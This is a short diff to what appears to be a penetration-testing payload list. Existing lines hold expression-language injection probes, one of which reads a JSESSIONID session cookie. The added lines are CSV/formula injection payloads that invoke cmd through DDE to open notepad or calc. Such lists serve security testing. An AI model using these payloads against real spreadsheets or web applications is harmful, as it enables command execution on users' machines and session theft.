@@ -24,3 +24,7 @@ EL tests
   ${99999+1}
   #{99999+1}
   ${cookie['JSESSIONID'].value}
+
+CSV injection
+	`=cmd|' /C notepad'!'A1'` 	#note - likely filtered against
+	`@SUM(1+9)*cmd|' /C calc'!A0`
